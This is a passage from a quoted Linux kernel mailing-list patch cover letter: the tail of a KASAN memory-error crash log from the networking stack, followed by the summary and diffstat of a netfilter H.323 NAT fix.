> > [  142.559195] [   T1073]  netlink_unicast (../include/net/net_namespac=
e.h:419:9 ../include/net/sock.h:713:9 ../net/netlink/af_netlink.c:1260:2 ..=
/net/netlink/af_netlink.c:1269:12 ../net/netlink/af_netlink.c:1359:9)
> > [  142.559272] [   T1073]  netlink_sendmsg (../net/netlink/af_netlink.c=
:1875:24)
> > [  142.559350] [   T1073]  __sys_sendto (../net/socket.c:790:2 ../net/s=
ocket.c:802:16 ../net/socket.c:2265:9)
> > [  142.559478] [   T1073]  __x64_sys_sendto (../net/socket.c:2272:9 ../=
net/socket.c:2268:1 ../net/socket.c:2268:1)
> > [  142.559530] [   T1073]  do_syscall_64 (../arch/x86/include/asm/entry=
-common.h:43:3 ../include/linux/irq-entry-common.h:100:2 ../include/linux/e=
ntry-common.h:174:2 ../arch/x86/entry/syscall_64.c:89:7)
> > [  142.559542] [   T1073]  entry_SYSCALL_64_after_hwframe (../arch/x86/=
entry/entry_64.S:121)
> > [  142.559645] [   T1073]  </TASK>
> >
> > [  142.559796] [   T1073] Allocated by task 1076 on cpu 3 at 142.556120=
s:
> > [  142.559809] [   T1073]  kasan_save_stack (../mm/kasan/common.c:57:15=
)
> > [  142.559833] [   T1073]  __kasan_slab_alloc (../mm/kasan/common.c:352=
:5)
> > [  142.559844] [   T1073]  kmem_cache_alloc_node_noprof (../mm/slub.c:4=
756:5 ../mm/slub.c:4883:11 ../mm/slub.c:4950:14)
> > [  142.559876] [   T1073]  kmalloc_reserve (../net/core/skbuff.c:613:9)
> > [  142.559892] [   T1073]  __alloc_skb (../net/core/skbuff.c:703:6)
> > [  142.559905] [   T1073]  alloc_skb_with_frags (../net/core/skbuff.c:6=
730:6)
> > [  142.559925] [   T1073]  sock_alloc_send_pskb (../include/net/sock.h:=
2117:10 ../net/core/sock.c:2959:14 ../net/core/sock.c:2996:11)
> > [  142.559942] [   T1073]  __ip_append_data (../include/linux/refcount.=
h:291:3 ../include/linux/refcount.h:312:2 ../net/ipv4/ip_output.c:1277:3)
> > [  142.559953] [   T1073]  ip_make_skb (../net/ipv4/ip_output.c:1583:1)
> > [  142.559964] [   T1073]  udp_sendmsg (../include/linux/rcupdate.h:867=
:2 ../include/net/l3mdev.h:102:3 ../net/ipv4/udp.c:1387:18)
> >
> > [  142.560041] [   T1073] The buggy address belongs to the object at ff=
ff88810fc8ed40
> > which belongs to the cache skbuff_small_head of size 704
> > [  142.560059] [   T1073] The buggy address is located 351 bytes inside=
 of
> > 704-byte region [ffff88810fc8ed40, ffff88810fc8f000)
> >
> > [  142.560245] [   T1073] Memory state around the buggy address:
> > [  142.560254] [   T1073]  ffff88810fc8ed80: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [  142.560264] [   T1073]  ffff88810fc8ee00: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [  142.560276] [   T1073] >ffff88810fc8ee80: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [  142.560287] [   T1073]                             ^
> > [  142.560317] [   T1073]  ffff88810fc8ef00: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [  142.560327] [   T1073]  ffff88810fc8ef80: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [  142.560335] [   T1073] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
> > [  142.560397] [   T1073] Disabling lock debugging due to kernel taint
> >
> > -----END crash log-----
> >
> > Best regards,
> > Zhiling Zou
> >
> > Zhiling Zou (1):
> >   netfilter: h323: keep NAT mangling aligned with parsed transport
> >
> >  net/ipv4/netfilter/nf_nat_h323.c       | 9 +++++++--
> >  net/netfilter/nf_conntrack_h323_main.c | 4 ++++
> >  2 files changed, 11 insertions(+), 2 deletions(-)
> >
> > --
> > 2.43.0
